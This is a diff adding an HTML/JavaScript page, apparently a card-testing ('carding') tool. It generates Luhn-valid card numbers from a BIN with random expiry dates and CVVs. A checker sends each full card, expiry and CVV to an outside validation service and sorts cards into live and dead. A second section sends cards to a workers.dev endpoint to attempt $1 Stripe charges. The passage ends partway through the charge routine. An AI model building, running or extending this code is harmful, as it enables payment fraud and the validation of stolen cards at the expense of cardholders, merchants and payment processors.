@@ -1,0 +1,1335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Deca Suite - Minimal API Checker</title>
+<style>
+  * { 
+    margin: 0; 
+    padding: 0; 
+    box-sizing: border-box; 
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  }
+
+  body {
+    background: #0d1117;
+    color: #c9d1d9;
+    min-height: 100vh;
+    padding: 20px;
+  }
+
+  .container {
+    max-width: 1000px;
+    margin: 0 auto;
+    background: #161b22;
+    border-radius: 8px;
+    padding: 25px;
+    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+  }
+
+  h1 {
+    text-align: center;
+    margin-bottom: 30px;
+    color: #58a6ff;
+    font-size: 1.8rem;
+    font-weight: 500;
+  }
+
+  .tabs {
+    display: flex;
+    margin-bottom: 25px;
+    background: #0d1117;
+    border-radius: 6px;
+    overflow: hidden;
+  }
+
+  .tab {
+    flex: 1;
+    padding: 12px;
+    text-align: center;
+    background: #0d1117;
+    border: none;
+    color: #8b949e;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-size: 0.95rem;
+  }
+
+  .tab:hover {
+    color: #c9d1d9;
+  }
+
+  .tab.active {
+    background: #1f6feb;
+    color: white;
+  }
+
+  .panel {
+    display: none;
+  }
+
+  .panel.active {
+    display: block;
+  }
+
+  .card {
+    background: #0d1117;
+    border-radius: 6px;
+    padding: 20px;
+    margin-bottom: 20px;
+  }
+
+  .card-title {
+    font-size: 1.1rem;
+    margin-bottom: 15px;
+    color: #58a6ff;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-weight: 500;
+  }
+
+  .input-group {
+    display: grid;
+    grid-template-columns: 1fr 1fr auto auto;
+    gap: 15px;
+    margin-bottom: 15px;
+  }
+
+  @media (max-width: 768px) {
+    .input-group {
+      grid-template-columns: 1fr;
+    }
+  }
+
+  input, textarea, select {
+    padding: 10px 12px;
+    border-radius: 4px;
+    border: 1px solid #30363d;
+    background: #0d1117;
+    color: #c9d1d9;
+    font-size: 0.95rem;
+  }
+
+  input:focus, textarea:focus, select:focus {
+    outline: none;
+    border-color: #58a6ff;
+  }
+
+  button {
+    padding: 10px 15px;
+    border: none;
+    border-radius: 4px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.15s;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 0.9rem;
+  }
+
+  .btn-primary {
+    background: #1f6feb;
+    color: white;
+  }
+
+  .btn-primary:hover {
+    background: #388bfd;
+  }
+
+  .btn-secondary {
+    background: #21262d;
+    color: #8b949e;
+    border: 1px solid #30363d;
+  }
+
+  .btn-secondary:hover {
+    background: #30363d;
+    color: #c9d1d9;
+  }
+
+  .btn-danger {
+    background: #da3633;
+    color: white;
+  }
+
+  .btn-danger:hover {
+    background: #f85149;
+  }
+
+  .btn-success {
+    background: #238636;
+    color: white;
+  }
+
+  .btn-success:hover {
+    background: #2ea043;
+  }
+
+  .btn-warning {
+    background: #dbab09;
+    color: white;
+  }
+
+  .btn-warning:hover {
+    background: #f2cc11;
+  }
+
+  .stats {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 15px;
+    margin: 20px 0;
+  }
+
+  .stat-box {
+    background: #0d1117;
+    padding: 15px;
+    border-radius: 6px;
+    text-align: center;
+  }
+
+  .stat-value {
+    font-size: 1.5rem;
+    font-weight: 500;
+    color: #58a6ff;
+    margin: 5px 0;
+  }
+
+  .stat-label {
+    font-size: 0.85rem;
+    color: #8b949e;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  .output {
+    background: #0d1117;
+    border-radius: 6px;
+    padding: 15px;
+    max-height: 350px;
+    overflow-y: auto;
+    font-family: 'Monaco', 'Consolas', monospace;
+    font-size: 0.85rem;
+    line-height: 1.6;
+  }
+
+  .output-line {
+    padding: 6px 0;
+    border-bottom: 1px solid #30363d;
+  }
+
+  .output-line:last-child {
+    border-bottom: none;
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: #1f6feb;
+    color: white;
+    padding: 12px 20px;
+    border-radius: 6px;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    opacity: 0;
+    transition: all 0.3s;
+    z-index: 1000;
+    font-size: 0.9rem;
+  }
+
+  .toast.show {
+    opacity: 1;
+    transform: translateX(-50%) translateY(0);
+  }
+
+  .empty-state {
+    text-align: center;
+    padding: 30px 15px;
+    color: #6e7681;
+    font-size: 0.9rem;
+  }
+
+  .view-toggle {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 15px;
+  }
+
+  .view-btn {
+    padding: 8px 15px;
+    background: #21262d;
+    border: 1px solid #30363d;
+    color: #8b949e;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.2s;
+    font-size: 0.85rem;
+  }
+
+  .view-btn.active {
+    background: #1f6feb;
+    color: white;
+    border-color: #1f6feb;
+  }
+
+  .live-only-view {
+    background: #0d1117;
+    border-radius: 6px;
+    padding: 15px;
+    margin-top: 15px;
+  }
+
+  .live-card {
+    padding: 8px 0;
+    border-bottom: 1px solid #30363d;
+    font-family: 'Monaco', 'Consolas', monospace;
+    font-size: 0.85rem;
+  }
+
+  .live-card:last-child {
+    border-bottom: none;
+  }
+
+  .progress-bar {
+    height: 5px;
+    background: #30363d;
+    border-radius: 3px;
+    margin: 10px 0;
+    overflow: hidden;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: #1f6feb;
+    width: 0%;
+    transition: width 0.3s;
+  }
+
+  .checking-status {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin: 10px 0;
+    padding: 10px;
+    background: #0d1117;
+    border-radius: 6px;
+    font-size: 0.9rem;
+  }
+
+  .spinner {
+    width: 16px;
+    height: 16px;
+    border: 2px solid #58a6ff;
+    border-top: 2px solid transparent;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  .control-buttons {
+    display: flex;
+    gap: 10px;
+    margin-top: 15px;
+    flex-wrap: wrap;
+  }
+
+  .api-card {
+    padding: 12px;
+    border-bottom: 1px solid #30363d;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .api-card:last-child {
+    border-bottom: none;
+  }
+
+  .live { color: #3fb950; }
+  .dead { color: #f85149; }
+  .charged { color: #3fb950; font-weight: bold; }
+  .declined { color: #f85149; font-weight: bold; }
+
+  .section-divider {
+    border-top: 1px solid #30363d;
+    margin: 25px 0;
+  }
+
+  .stripe-section {
+    background: #0d1117;
+    border-radius: 6px;
+    padding: 20px;
+    margin-top: 20px;
+  }
+
+  .stripe-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 15px;
+  }
+
+  .stripe-title {
+    font-size: 1.1rem;
+    color: #f2cc11;
+    font-weight: 500;
+  }
+
+  .charged-card {
+    padding: 8px 0;
+    border-bottom: 1px solid #30363d;
+    font-family: 'Monaco', 'Consolas', monospace;
+    font-size: 0.85rem;
+    display: flex;
+    justify-content: space-between;
+  }
+
+  .charged-card:last-child {
+    border-bottom: none;
+  }
+
+  .charged-badge {
+    background: #238636;
+    color: white;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-size: 0.7rem;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Deca Suite - Minimal API Checker</h1>
+  
+  <div class="tabs">
+    <button class="tab active" onclick="switchTab('generator')">Generator</button>
+    <button class="tab" onclick="switchTab('checker')">API Checker</button>
+  </div>
+  
+  <!-- GENERATOR PANEL -->
+  <div class="panel active" id="generatorPanel">
+    <div class="card">
+      <div class="card-title">Card Generator</div>
+      <div class="input-group">
+        <div>
+          <input type="text" id="binInput" placeholder="BIN (e.g. 45854600107)" value="45854600107">
+        </div>
+        <div>
+          <select id="cardType">
+            <option value="visa">Visa (16 digits)</option>
+            <option value="mc">Mastercard (16 digits)</option>
+            <option value="amex">American Express (15 digits)</option>
+            <option value="discover">Discover (16 digits)</option>
+          </select>
+        </div>
+        <div>
+          <input type="number" id="countInput" value="50" min="1" max="500">
+        </div>
+        <button class="btn-primary" onclick="generate()">
+          <span>Generate</span>
+        </button>
+      </div>
+      <div style="display: flex; gap: 10px;">
+        <button class="btn-secondary" onclick="copyGenerated()">
+          <span>Copy All</span>
+        </button>
+        <button class="btn-secondary" onclick="clearGenerator()">
+          <span>Clear</span>
+        </button>
+      </div>
+    </div>
+    
+    <div class="stats">
+      <div class="stat-box">
+        <div class="stat-value" id="statCount">0</div>
+        <div class="stat-label">Generated</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-value" id="statReq">0</div>
+        <div class="stat-label">Requested</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-value" id="statAttempts">0</div>
+        <div class="stat-label">Attempts</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-value" id="statRate">0%</div>
+        <div class="stat-label">Success Rate</div>
+      </div>
+    </div>
+    
+    <div class="card">
+      <div class="card-title">Generated Cards</div>
+      <div class="output" id="output">
+        <div class="empty-state">Configure parameters and click Generate</div>
+      </div>
+      <div style="margin-top: 15px;">
+        <button class="btn-secondary" onclick="sendToChecker()">Send to API Checker</button>
+      </div>
+    </div>
+  </div>
+  
+  <!-- CHECKER PANEL -->
+  <div class="panel" id="checkerPanel">
+    <div class="card">
+      <div class="card-title">API Checker</div>
+      <textarea id="checkerInput" placeholder="Paste cards (card|exp|cvv) - one per line" style="width: 100%; height: 150px;"></textarea>
+      <div class="control-buttons">
+        <button class="btn-primary" onclick="runAPIChecker()">
+          <span>Run Check</span>
+        </button>
+        <button class="btn-danger" onclick="stopAPIChecker()">
+          <span>Stop</span>
+        </button>
+        <button class="btn-secondary" onclick="clearChecker()">
+          <span>Clear</span>
+        </button>
+      </div>
+    </div>
+    
+    <div class="checking-status" id="checkingStatus" style="display: none;">
+      <div class="spinner"></div>
+      <span>Checking cards...</span>
+      <span id="progressText"></span>
+    </div>
+    
+    <div class="progress-bar">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    
+    <div class="view-toggle">
+      <button class="view-btn active" onclick="showAllResults()">All Results</button>
+      <button class="view-btn" onclick="showLiveOnly()">Live Only</button>
+    </div>
+    
+    <div class="stats">
+      <div class="stat-box">
+        <div class="stat-value" id="apiStatTotal">0</div>
+        <div class="stat-label">Total</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-value" id="apiStatLive" style="color: #3fb950;">0</div>
+        <div class="stat-label">Live</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-value" id="apiStatDead" style="color: #f85149;">0</div>
+        <div class="stat-label">Dead</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-value" id="apiStatRate">0%</div>
+        <div class="stat-label">Success Rate</div>
+      </div>
+    </div>
+    
+    <div id="allResultsView">
+      <div class="card">
+        <div class="card-title">API Responses</div>
+        <div class="output" id="apiOutput">
+          <div class="empty-state">No checks performed yet</div>
+        </div>
+      </div>
+    </div>
+    
+    <div id="liveOnlyView" style="display: none;">
+      <div class="card">
+        <div class="card-title">Live Cards Only</div>
+        <div class="live-only-view" id="liveCardsOutput">
+          <div class="empty-state">No live cards found</div>
+        </div>
+        <div style="margin-top: 15px;">
+          <button class="btn-success" onclick="copyLiveCards()">
+            <span>Copy All Live Cards</span>
+          </button>
+        </div>
+      </div>
+    </div>
+    
+    <!-- STRIPE CHARGE SECTION -->
+    <div class="section-divider"></div>
+    
+    <div class="stripe-section">
+      <div class="stripe-header">
+        <div class="stripe-title">⚡ Stripe Charge 1$</div>
+      </div>
+      
+      <textarea id="stripeInput" placeholder="Paste cards to charge (card|exp|cvv) - one per line" style="width: 100%; height: 100px; margin-bottom: 15px;"></textarea>
+      
+      <div class="control-buttons">
+        <button class="btn-warning" onclick="runStripeCharge()">
+          <span>Run Charge</span>
+        </button>
+        <button class="btn-danger" onclick="stopStripeCharge()">
+          <span>Stop</span>
+        </button>
+        <button class="btn-secondary" onclick="clearStripeCharge()">
+          <span>Clear</span>
+        </button>
+      </div>
+      
+      <div class="checking-status" id="stripeCheckingStatus" style="display: none;">
+        <div class="spinner"></div>
+        <span>Charging cards...</span>
+        <span id="stripeProgressText"></span>
+      </div>
+      
+      <div class="progress-bar">
+        <div class="progress-fill" id="stripeProgressFill"></div>
+      </div>
+      
+      <div class="view-toggle">
+        <button class="view-btn active" onclick="showAllCharges()">All Charges</button>
+        <button class="view-btn" onclick="showChargedOnly()">Charged Only</button>
+      </div>
+      
+      <div class="stats">
+        <div class="stat-box">
+          <div class="stat-value" id="stripeStatTotal">0</div>
+          <div class="stat-label">Total</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-value" id="stripeStatCharged" style="color: #3fb950;">0</div>
+          <div class="stat-label">Charged</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-value" id="stripeStatDeclined" style="color: #f85149;">0</div>
+          <div class="stat-label">Declined</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-value" id="stripeStatRate">0%</div>
+          <div class="stat-label">Success Rate</div>
+        </div>
+      </div>
+      
+      <div id="allChargesView">
+        <div class="card">
+          <div class="card-title">Charge Results</div>
+          <div class="output" id="stripeOutput">
+            <div class="empty-state">No charges performed yet</div>
+          </div>
+        </div>
+      </div>
+      
+      <div id="chargedOnlyView" style="display: none;">
+        <div class="card">
+          <div class="card-title">Charged Cards Only</div>
+          <div class="live-only-view" id="chargedCardsOutput">
+            <div class="empty-state">No charged cards found</div>
+          </div>
+          <div style="margin-top: 15px;">
+            <button class="btn-success" onclick="copyChargedCards()">
+              <span>Copy All Charged Cards</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast">
+  <span id="toastMessage">Copied to clipboard</span>
+</div>
+
+<script>
+// State management
+let generatedLines = [];
+let apiResults = [];
+let stripeResults = [];
+let isChecking = false;
+let isStripeChecking = false;
+
+// Tab switching
+function switchTab(tab) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  
+  if (tab === 'generator') {
+    document.querySelector('.tab:nth-child(1)').classList.add('active');
+    document.getElementById('generatorPanel').classList.add('active');
+  } else {
+    document.querySelector('.tab:nth-child(2)').classList.add('active');
+    document.getElementById('checkerPanel').classList.add('active');
+  }
+}
+
+// View toggling for API checker
+function showAllResults() {
+  document.querySelector('.view-btn:nth-child(1)').classList.add('active');
+  document.querySelector('.view-btn:nth-child(2)').classList.remove('active');
+  document.getElementById('allResultsView').style.display = 'block';
+  document.getElementById('liveOnlyView').style.display = 'none';
+}
+
+function showLiveOnly() {
+  document.querySelector('.view-btn:nth-child(1)').classList.remove('active');
+  document.querySelector('.view-btn:nth-child(2)').classList.add('active');
+  document.getElementById('allResultsView').style.display = 'none';
+  document.getElementById('liveOnlyView').style.display = 'block';
+  renderLiveCards();
+}
+
+// View toggling for Stripe charges
+function showAllCharges() {
+  document.querySelectorAll('.view-btn')[2].classList.add('active');
+  document.querySelectorAll('.view-btn')[3].classList.remove('active');
+  document.getElementById('allChargesView').style.display = 'block';
+  document.getElementById('chargedOnlyView').style.display = 'none';
+}
+
+function showChargedOnly() {
+  document.querySelectorAll('.view-btn')[2].classList.remove('active');
+  document.querySelectorAll('.view-btn')[3].classList.add('active');
+  document.getElementById('allChargesView').style.display = 'none';
+  document.getElementById('chargedOnlyView').style.display = 'block';
+  renderChargedCards();
+}
+
+// Luhn algorithm implementation
+function luhnValidate(cardNumber) {
+  const clean = cardNumber.replace(/\D/g, '');
+  if (clean.length < 13 || clean.length > 19) return false;
+  
+  let sum = 0;
+  let isEven = false;
+  
+  for (let i = clean.length - 1; i >= 0; i--) {
+    let digit = parseInt(clean.charAt(i), 10);
+    
+    if (isEven) {
+      digit *= 2;
+      if (digit > 9) {
+        digit -= 9;
+      }
+    }
+    
+    sum += digit;
+    isEven = !isEven;
+  }
+  
+  return sum % 10 === 0;
+}
+
+// Determine card type from number
+function getCardType(cardNumber) {
+  const clean = cardNumber.replace(/\D/g, '');
+  
+  if (clean.startsWith('34') || clean.startsWith('37')) {
+    return 'amex';
+  } else if (clean.startsWith('4')) {
+    return 'visa';
+  } else if (clean.startsWith('5') || 
+             (clean.startsWith('2') && 
+              parseInt(clean.substring(0, 2)) >= 22 && 
+              parseInt(clean.substring(0, 2)) <= 27)) {
+    return 'mc';
+  } else if (clean.startsWith('6')) {
+    return 'discover';
+  }
+  return 'unknown';
+}
+
+// Generate card with valid Luhn check digit
+function generateCard(binPrefix, cardType) {
+  let partial = String(binPrefix);
+  const targetLength = cardType === 'amex' ? 15 : 16;
+  
+  while (partial.length < targetLength - 1) {
+    partial += Math.floor(Math.random() * 10);
+  }
+  
+  let sum = 0;
+  let isEven = (targetLength % 2) === 0;
+  
+  for (let i = partial.length - 1; i >= 0; i--) {
+    let digit = parseInt(partial.charAt(i), 10);
+    
+    if (isEven) {
+      digit *= 2;
+      if (digit > 9) {
+        digit -= 9;
+      }
+    }
+    
+    sum += digit;
+    isEven = !isEven;
+  }
+  
+  const checkDigit = (10 - (sum % 10)) % 10;
+  return partial + checkDigit;
+}
+
+// Generate random expiry date
+function generateExpiry() {
+  const month = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
+  const year = String(Math.floor(Math.random() * 6) + 26);
+  return `${month}/${year}`;
+}
+
+// Generate CVV based on card type
+function generateCVV(cardType) {
+  const length = cardType === 'amex' ? 4 : 3;
+  let cvv = '';
+  for (let i = 0; i < length; i++) {
+    cvv += Math.floor(Math.random() * 10);
+  }
+  return cvv;
+}
+
+// Validate generated card
+function validateGenerated(card, exp, cvv, bin, cardType) {
+  try {
+    const actualCardType = getCardType(card);
+    const expectedLength = cardType === 'amex' ? 15 : 16;
+    
+    if (card.length !== expectedLength) return false;
+    if (actualCardType !== cardType) return false;
+    if (!card.startsWith(String(bin))) return false;
+    if (!/^\d+$/.test(card)) return false;
+    if (!luhnValidate(card)) return false;
+    
+    const expectedCVVLength = cardType === 'amex' ? 4 : 3;
+    if (cvv.length !== expectedCVVLength || !/^\d+$/.test(cvv)) return false;
+    
+    if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
+    const [month, year] = exp.split('/').map(Number);
+    if (month < 1 || month > 12) return false;
+    
+    const expDate = new Date(2000 + year, month - 1);
+    const now = new Date();
+    now.setHours(0, 0, 0, 0);
+    
+    return expDate >= now;
+  } catch {
+    return false;
+  }
+}
+
+// Generator functions
+function generate() {
+  const bin = document.getElementById('binInput').value.trim() || '45854600107';
+  const cardType = document.getElementById('cardType').value;
+  const count = Math.min(parseInt(document.getElementById('countInput').value) || 50, 500);
+  
+  generatedLines = [];
+  let attempts = 0;
+  const maxAttempts = count * 100;
+  
+  while (generatedLines.length < count && attempts < maxAttempts) {
+    attempts++;
+    
+    const card = generateCard(bin, cardType);
+    const exp = generateExpiry();
+    const cvv = generateCVV(getCardType(card));
+    
+    if (validateGenerated(card, exp, cvv, bin, cardType)) {
+      generatedLines.push({ card, exp, cvv });
+    }
+  }
+  
+  // Update stats
+  document.getElementById('statCount').textContent = generatedLines.length;
+  document.getElementById('statReq').textContent = count;
+  document.getElementById('statAttempts').textContent = attempts;
+  document.getElementById('statRate').textContent = attempts > 0 
+    ? Math.round((generatedLines.length / attempts) * 100) + '%' 
+    : '0%';
+  
+  // Render output
+  const output = document.getElementById('output');
+  if (generatedLines.length === 0) {
+    output.innerHTML = '<div class="empty-state">No valid cards generated</div>';
+    return;
+  }
+  
+  let html = '';
+  generatedLines.forEach((item, i) => {
+    html += `<div class="output-line">${String(i + 1).padStart(3, '0')} | ${item.card} | ${item.exp} | ${item.cvv}</div>`;
+  });
+  
+  output.innerHTML = html;
+  
+  showToast(`Generated ${generatedLines.length} cards`);
+}
+
+function copyGenerated() {
+  if (generatedLines.length === 0) {
+    showToast('Nothing to copy');
+    return;
+  }
+  
+  const text = generatedLines.map(l => `${l.card}|${l.exp}|${l.cvv}`).join('\n');
+  navigator.clipboard.writeText(text).then(() => {
+    showToast('Copied all generated cards');
+  });
+}
+
+function sendToChecker() {
+  if (generatedLines.length === 0) {
+    showToast('Generate cards first');
+    return;
+  }
+  
+  const text = generatedLines.map(l => `${l.card}|${l.exp}|${l.cvv}`).join('\n');
+  document.getElementById('checkerInput').value = text;
+  switchTab('checker');
+  showToast('Cards sent to API checker');
+}
+
+function clearGenerator() {
+  generatedLines = [];
+  document.getElementById('output').innerHTML = '<div class="empty-state">Configure parameters and click Generate</div>';
+  
+  document.getElementById('statCount').textContent = '0';
+  document.getElementById('statReq').textContent = '0';
+  document.getElementById('statAttempts').textContent = '0';
+  document.getElementById('statRate').textContent = '0%';
+}
+
+// API Checker functions
+async function checkCardAPI(cardData) {
+  const parts = cardData.split('|');
+  if (parts.length < 3) {
+    return { 
+      status: 'dead', 
+      message: 'Invalid format', 
+      card: { card: cardData } 
+    };
+  }
+  
+  const card = parts[0];
+  const exp = parts[1];
+  const cvv = parts[2];
+  
+  if (!card || !exp || !cvv) {
+    return { 
+      status: 'dead', 
+      message: 'Invalid format', 
+      card: { card: cardData } 
+    };
+  }
+  
+  const [month, year] = exp.split('/');
+  const fullYear = `20${year}`;
+  
+  const requestData = {
+    data: `${card}|${month}|${fullYear}|${cvv}`
+  };
+  
+  try {
+    const response = await fetch('https://api.chkr.cc/', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(requestData)
+    });
+    
+    if (!response.ok) {
+      return { 
+        status: 'dead', 
+        message: `HTTP ${response.status}`, 
+        card: { card: cardData } 
+      };
+    }
+    
+    const result = await response.json();
+    return result;
+  } catch (error) {
+    return { 
+      status: 'dead', 
+      message: error.message, 
+      card: { card: cardData } 
+    };
+  }
+}
+
+function formatAPIResponse(response, index) {
+  const cardData = response.card.card.split('|');
+  const cardNumber = cardData[0] || 'N/A';
+  const exp = cardData[1] && cardData[2] ? `${cardData[1]}/${cardData[2].substring(2)}` : 'N/A';
+  
+  let statusClass = '';
+  let statusText = '';
+  
+  if (response.code === 1) {
+    statusClass = 'live';
+    statusText = 'LIVE';
+  } else {
+    statusClass = 'dead';
+    statusText = 'DEAD';
+  }
+  
+  return `
+    <div class="api-card">
+      <div>Card #${index + 1} | ${cardNumber} | ${exp}</div>
+      <div class="${statusClass}">${statusText}</div>
+    </div>
+  `;
+}
+
+function renderLiveCards() {
+  const liveResults = apiResults.filter(result => result.code === 1);
+  
+  if (liveResults.length === 0) {
+    document.getElementById('liveCardsOutput').innerHTML = '<div class="empty-state">No live cards found</div>';
+    return;
+  }
+  
+  let html = '';
+  liveResults.forEach((result, index) => {
+    const cardData = result.card.card;
+    html += `<div class="live-card">${cardData}</div>`;
+  });
+  
+  document.getElementById('liveCardsOutput').innerHTML = html;
+}
+
+function copyLiveCards() {
+  const liveResults = apiResults.filter(result => result.code === 1);
+  
+  if (liveResults.length === 0) {
+    showToast('No live cards to copy');
+    return;
+  }
+  
+  const liveCardsText = liveResults.map(result => result.card.card).join('\n');
+  navigator.clipboard.writeText(liveCardsText).then(() => {
+    showToast(`Copied ${liveResults.length} live cards`);
+  });
+}
+
+async function runAPIChecker() {
+  const input = document.getElementById('checkerInput').value.trim();
+  
+  if (!input) {
+    showToast('Paste cards to check');
+    return;
+  }
+  
+  const lines = input.split('\n').filter(l => l.trim());
+  if (lines.length === 0) {
+    showToast('No valid cards found');
+    return;
+  }
+  
+  isChecking = true;
+  apiResults = [];
+  
+  document.getElementById('checkingStatus').style.display = 'flex';
+  document.getElementById('apiOutput').innerHTML = '';
+  
+  document.getElementById('apiStatTotal').textContent = lines.length;
+  document.getElementById('apiStatLive').textContent = '0';
+  document.getElementById('apiStatDead').textContent = '0';
+  document.getElementById('apiStatRate').textContent = '0%';
+  
+  for (let i = 0; i < lines.length && isChecking; i++) {
+    if (!isChecking) break;
+    
+    const progress = ((i + 1) / lines.length) * 100;
+    document.getElementById('progressFill').style.width = `${progress}%`;
+    document.getElementById('progressText').textContent = `${i + 1}/${lines.length}`;
+    
+    const result = await checkCardAPI(lines[i]);
+    apiResults.push(result);
+    
+    const liveCount = apiResults.filter(r => r.code === 1).length;
+    const deadCount = apiResults.length - liveCount;
+    document.getElementById('apiStatLive').textContent = liveCount;
+    document.getElementById('apiStatDead').textContent = deadCount;
+    document.getElementById('apiStatRate').textContent = 
+      apiResults.length > 0 ? Math.round((liveCount / apiResults.length) * 100) + '%' : '0%';
+    
+    const responseHtml = formatAPIResponse(result, i);
+    document.getElementById('apiOutput').innerHTML += responseHtml;
+    
+    const output = document.getElementById('apiOutput');
+    output.scrollTop = output.scrollHeight;
+    
+    if (document.getElementById('liveOnlyView').style.display !== 'none') {
+      renderLiveCards();
+    }
+    
+    await new Promise(resolve => setTimeout(resolve, 300));
+  }
+  
+  document.getElementById('checkingStatus').style.display = 'none';
+  document.getElementById('progressFill').style.width = '100%';
+  
+  isChecking = false;
+  showToast(`Checked ${lines.length} cards`);
+}
+
+function stopAPIChecker() {
+  isChecking = false;
+  document.getElementById('checkingStatus').style.display = 'none';
+  showToast('Checking stopped');
+}
+
+function clearChecker() {
+  document.getElementById('checkerInput').value = '';
+  
+  document.getElementById('apiStatTotal').textContent = '0';
+  document.getElementById('apiStatLive').textContent = '0';
+  document.getElementById('apiStatDead').textContent = '0';
+  document.getElementById('apiStatRate').textContent = '0%';
+  
+  document.getElementById('progressFill').style.width = '0%';
+  document.getElementById('progressText').textContent = '';
+  
+  document.getElementById('apiOutput').innerHTML = '<div class="empty-state">No checks performed yet</div>';
+  document.getElementById('liveCardsOutput').innerHTML = '<div class="empty-state">No live cards found</div>';
+  
+  document.getElementById('checkingStatus').style.display = 'none';
+  
+  apiResults = [];
+  isChecking = false;
+  
+  // Clear Stripe section as well
+  document.getElementById('stripeStatTotal').textContent = '0';
+  document.getElementById('stripeStatCharged').textContent = '0';
+  document.getElementById('stripeStatDeclined').textContent = '0';
+  document.getElementById('stripeStatRate').textContent = '0%';
+  
+  document.getElementById('stripeProgressFill').style.width = '0%';
+  document.getElementById('stripeProgressText').textContent = '';
+  
+  document.getElementById('stripeOutput').innerHTML = '<div class="empty-state">No charges performed yet</div>';
+  document.getElementById('chargedCardsOutput').innerHTML = '<div class="empty-state">No charged cards found</div>';
+  
+  document.getElementById('stripeCheckingStatus').style.display = 'none';
+  
+  stripeResults = [];
+  isStripeChecking = false;
+}
+
+// Stripe Charge functions
+async function chargeCardStripe(cardData) {
+  const parts = cardData.split('|');
+  if (parts.length < 3) {
+    return { 
+      status: 'DECLINED', 
+      response: 'invalid_format',
+      message: 'Invalid card format',
+      card: cardData 
+    };
+  }
+  
+  const card = parts[0];
+  const exp = parts[1];
+  const cvv = parts[2];
+  
+  if (!card || !exp || !cvv) {
+    return { 
+      status: 'DECLINED', 
+      response: 'invalid_format',
+      message: 'Invalid card format',
+      card: cardData 
+    };
+  }
+  
+  const [month, year] = exp.split('/');
+  const fullYear = `20${year}`;
+  const formattedCard = `${card}|${month}|${fullYear}|${cvv}`;
+  
+  try {
+    const response = await fetch(`https://stripe.melmelmel.workers.dev/?card=${formattedCard}`);
+    
+    if (!response.ok) {
+      return { 
+        status: 'DECLINED', 
+        response: 'http_error',
+        message: `HTTP ${response.status}`,
+        card: cardData 
+      };
+    }
+    
+    const result = await response.json();
+    return {
+      ...result,
+      card: cardData
+    };
+  } catch (error) {
+    return { 
+      status: 'DECLINED', 
+      response: 'network_error',
+      message: error.message,
+      card: cardData 
+    };
+  }
+}
+
+function formatStripeResponse(response, index) {
+  const cardData = response.card || 'N/A';
+  let statusClass = '';
+  let statusText = '';
+  
+  if (response.status === 'CHARGED') {
+    statusClass = 'charged';
+    statusText = 'CHARGED';
+  } else {
+    statusClass = 'declined';
+    statusText = 'DECLINED';
+  }
+  
+  return `
+    <div class="api-card">
+      <div>Card #${index + 1} | ${cardData}</div>
+      <div class="${statusClass}">${statusText}</div>
+    </div>
+  `;
+}
+
+function renderChargedCards() {
+  const chargedResults = stripeResults.filter(result => result.status === 'CHARGED');
+  
+  if (chargedResults.length === 0) {
+    document.getElementById('chargedCardsOutput').innerHTML = '<div class="empty-state">No charged cards found</div>';
+    return;
+  }
+  
+  let html = '';
+  chargedResults.forEach((result, index) => {
+    const cardData = result.card || 'N/A';
+    html += `<div class="charged-card">
+      <span>${cardData}</span>
+      <span class="charged-badge">CHARGED</span>
+    </div>`;
+  });
+  
+  document.getElementById('chargedCardsOutput').innerHTML = html;
+}
+
+function copyChargedCards() {
+  const chargedResults = stripeResults.filter(result => result.status === 'CHARGED');
+  
+  if (chargedResults.length === 0) {
+    showToast('No charged cards to copy');
+    return;
+  }
+  
+  const chargedCardsText = chargedResults.map(result => result.card || 'N/A').join('\n');
+  navigator.clipboard.writeText(chargedCardsText).then(() => {
+    showToast(`Copied ${chargedResults.length} charged cards`);
+  });
+}
+
+async function runStripeCharge() {
+  const input = document.getElementById('stripeInput').value.trim();
+  
+  if (!input) {
+    showToast('Paste cards to charge');
+    return;
+  }
+  
+  const lines = input.split('\n').filter(l => l.trim());
+  if (lines.length === 0) {
+    showToast('No valid cards found');
+    return;
+  }
+  
+  isStripeChecking = true;
+  stripeResults = [];
+  
+  document.getElementById('stripeCheckingStatus').style.display = 'flex';
+  document.getElementById('stripeOutput').innerHTML = '';
+  
+  document.getElementById('stripeStatTotal').textContent = lines.length;
+  document.getElementById('stripeStatCharged').textContent = '0';
+  document.getElementById('stripeStatDeclined').textContent = '0';
